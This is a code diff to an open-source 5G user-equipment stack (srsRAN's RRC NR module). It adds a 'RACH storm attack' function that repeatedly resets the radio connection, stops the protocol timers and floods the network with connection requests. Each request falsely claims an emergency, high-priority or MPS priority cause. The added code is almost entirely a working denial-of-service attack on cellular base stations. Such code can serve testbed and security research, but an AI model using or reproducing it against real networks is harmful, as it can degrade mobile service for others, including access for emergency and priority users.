@@ -27,6 +27,9 @@
 #include "srsran/interfaces/ue_rlc_interfaces.h"
 #include "srsue/hdr/stack/rrc_nr/rrc_nr_procedures.h"
 #include "srsue/hdr/stack/upper/usim.h"
+#include <chrono>
+#include <random>
+#include <thread>
 
 using namespace asn1::rrc_nr;
 using namespace asn1;
@@ -244,7 +247,12 @@ void rrc_nr::in_sync() {}
 void rrc_nr::out_of_sync() {}
 
 // MAC interface
-void rrc_nr::run_tti(uint32_t tti) {}
+void rrc_nr::run_tti(uint32_t tti)
+{
+  // Process on-going procedures in callback_list
+  // This is CRITICAL for procedures like setup_request_proc to progress
+  callback_list.run();
+}
 
 // PDCP interface
 void rrc_nr::write_pdu(uint32_t lcid, srsran::unique_byte_buffer_t pdu)
@@ -2364,6 +2372,131 @@ void rrc_nr::set_phy_config_complete(bool status)
       break;
   }
   phy_cfg_state = PHY_CFG_STATE_NONE;
+}
+
+void rrc_nr::start_rach_storm_attack()
+{
+  logger.info("[RRC_ATTACK_NR] Starting RACH storm attack");
+
+  const int max_attacks        = args.rrc_storming_max_attacks > 0 ? args.rrc_storming_max_attacks : 1000;
+  const int attack_interval_ms = args.rrc_storming_interval_ms > 0 ? args.rrc_storming_interval_ms : 500;
+
+  logger.info("[RRC_ATTACK_NR] Max cycles: %d, interval: %dms", max_attacks, attack_interval_ms);
+
+  std::random_device                    rd;
+  std::mt19937                          gen(rd());
+  std::uniform_int_distribution<uint8_t> cause_dist(0, 2);
+
+  int cycle_count      = 0;
+  int successful_count = 0;
+
+  while (cycle_count < max_attacks && running) {
+    try {
+      cycle_count++;
+      logger.info("[RRC_ATTACK_NR] Cycle %d/%d", cycle_count, max_attacks);
+
+      // Force disconnect and reset
+      logger.info("[RRC_ATTACK_NR] Forcing full disconnect");
+      
+      // First, reset MAC to clear RNTI and stop transmissions
+      mac->reset();
+      
+      // Then release RRC
+      rrc_release();
+      
+      // Force state to IDLE
+      state = RRC_NR_STATE_IDLE;
+
+      // **CRITICAL FIX:** Stop all RRC timers to unblock procedures
+      logger.info("[RRC_ATTACK_NR] Timer states before stop - T300: %s, T301: %s, T302: %s",
+                  t300.is_running() ? "RUNNING" : "stopped",
+                  t301.is_running() ? "RUNNING" : "stopped",
+                  t302.is_running() ? "RUNNING" : "stopped");
+      
+      if (t300.is_running()) t300.stop();
+      if (t301.is_running()) t301.stop();
+      if (t302.is_running()) t302.stop();
+      if (t310.is_running()) t310.stop();
+      if (t311.is_running()) t311.stop();
+      if (t304.is_running()) t304.stop();
+      
+      logger.info("[RRC_ATTACK_NR] All timers stopped. T300 now: %s", t300.is_running() ? "RUNNING" : "stopped");
+
+      // Check procedure states
+      logger.info("[RRC_ATTACK_NR] Procedure states - setup_req: %s, cell_selector: %s, callback_list size: %d",
+                  setup_req_proc.is_busy() ? "BUSY" : "idle",
+                  cell_selector.is_busy() ? "BUSY" : "idle",
+                  (int)callback_list.size());
+
+      // **KEY FIX:** Run callback_list repeatedly until setup_req_proc completes
+      // After stopping t300, the procedure's step() should return error and complete
+      logger.info("[RRC_ATTACK_NR] Processing procedures to completion...");
+      int process_iterations = 0;
+      while ((setup_req_proc.is_busy() || cell_selector.is_busy()) && process_iterations < 20 && running) {
+        size_t cb_size_before = callback_list.size();
+        callback_list.run();
+        size_t cb_size_after = callback_list.size();
+        
+        logger.debug("[RRC_ATTACK_NR] Iteration %d: callback_list %d->%d, setup_req=%s, cell_selector=%s",
+                     process_iterations,
+                     (int)cb_size_before,
+                     (int)cb_size_after,
+                     setup_req_proc.is_busy() ? "BUSY" : "idle",
+                     cell_selector.is_busy() ? "BUSY" : "idle");
+        
+        if (setup_req_proc.is_busy() || cell_selector.is_busy()) {
+          std::this_thread::sleep_for(std::chrono::milliseconds(10));
+          process_iterations++;
+        }
+      }
+      
+      if (setup_req_proc.is_busy()) {
+        logger.error("[RRC_ATTACK_NR] setup_req_proc STILL busy after %d attempts (callback_list size: %d) - skipping cycle",
+                     process_iterations, (int)callback_list.size());
+        continue;
+      } else if (cell_selector.is_busy()) {
+        logger.error("[RRC_ATTACK_NR] cell_selector STILL busy after %d attempts - skipping cycle", process_iterations);
+        continue;
+      } else {
+        logger.info("[RRC_ATTACK_NR] All procedures cleared after %d iterations", process_iterations);
+      }
+
+      // Pick random high-priority cause
+      srsran::nr_establishment_cause_t cause;
+      const char*                      cause_str;
+      uint8_t                          selector = cause_dist(gen);
+
+      if (selector == 0) {
+        cause     = srsran::nr_establishment_cause_t::emergency;
+        cause_str = "emergency";
+      } else if (selector == 1) {
+        cause     = srsran::nr_establishment_cause_t::highPriorityAccess;
+        cause_str = "highPriorityAccess";
+      } else {
+        cause     = srsran::nr_establishment_cause_t::mps_PriorityAccess;
+        cause_str = "mps_PriorityAccess";
+      }
+
+      logger.info("[RRC_ATTACK_NR] Calling connection_request (cause: %s)", cause_str);
+
+      // Try connection_request - it will fail if setup_req_proc is still busy, that's ok
+      int ret = connection_request(cause, nullptr);
+      if (ret == SRSRAN_SUCCESS) {
+        successful_count++;
+        logger.info("[RRC_ATTACK_NR] Request initiated successfully (%d total)", successful_count);
+      } else {
+        logger.debug("[RRC_ATTACK_NR] connection_request failed (busy or error), will retry next cycle");
+      }
+
+      std::this_thread::sleep_for(std::chrono::milliseconds(attack_interval_ms));
+
+    } catch (const std::exception& e) {
+      logger.error("[RRC_ATTACK_NR] Exception: %s", e.what());
+      break;
+    }
+  }
+
+  logger.info("[RRC_ATTACK_NR] Finished. Cycles: %d, Initiated: %d", cycle_count, successful_count);
 }
 
 } // namespace srsue
